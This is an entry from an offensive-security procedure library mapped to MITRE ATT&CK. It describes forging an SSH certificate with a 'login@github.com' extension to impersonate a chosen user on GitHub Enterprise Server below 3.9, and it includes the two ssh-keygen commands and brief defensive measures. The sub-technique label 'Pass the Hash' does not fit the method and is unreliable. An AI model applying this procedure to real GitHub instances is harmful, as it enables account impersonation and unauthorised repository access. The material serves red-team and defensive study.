---
id: 123e4567-e89b-12d3-a456-426614174003
name: Create-Malicious-SSH-Certificate
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.896Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Use Alternate Authentication Material]]'
sub_techniques:
  - '[[Pass the Hash]]'
tags:
  - ssh-certificate
  - impersonation
  - github
commands: []
platforms:
  - Linux
  - Web
  - Cloud (GitHub Enterprise)
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Use Alternate Authentication Material]]'
---

# Create-Malicious-SSH-Certificate

## Summary

This procedure generates a malicious SSH certificate by embedding a forged `login@github.com=target_username` extension, allowing impersonation of the target user for authentication to GitHub services like gists.

## Description

Using OpenSSH tools, an attacker creates a certificate signed by a CA (assuming access or simulation) with custom extensions to specify any username. This exploits the lack of validation in gist authentication, enabling push access without legitimate credentials. Applicable to GitHub Enterprise Server < 3.9.

## Requirements

1. OpenSSH installed on a Linux system
2. Access to a signing CA key (or simulation for testing)
3. Target username known

## Defense

Defensive measures and detection strategies:

- Restrict CA signing to verified extensions only
- Validate all certificate extensions server-side
- Monitor for certificates with unusual login extensions

## Objectives

1. Forge a certificate for user impersonation
2. Ensure the certificate is usable for SSH authentication
3. Prepare for use in gist push operations

## Instructions

### Step 1: Generate Key Pair

**Context**: Create a public/private key pair for the certificate.

Use `ssh-keygen` to generate a new key:

```bash
ssh-keygen -t ed25519 -f target_key
```

### Step 2: Sign with Malicious Extension

**Context**: Sign the public key with the impersonation extension using the CA.

Use `ssh-keygen` to sign, adding the extension:

```bash
ssh-keygen -s ca_key -I impersonation_cert -n *,!root -O extension:login@github.com=target_username target_key.pub
```

This creates `target_key.pub-cert.pub` with the forged extension.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Use Alternate Authentication Material]]

### Sub-Techniques

- [[Pass the Hash]]

## Commands Used

- [[ssh-keygen-generate]]
- [[ssh-keygen-sign]]

## Tools Used

- [[OpenSSH]]

## Tags

- [[ssh-certificate]]
- [[impersonation]]
- [[github]]
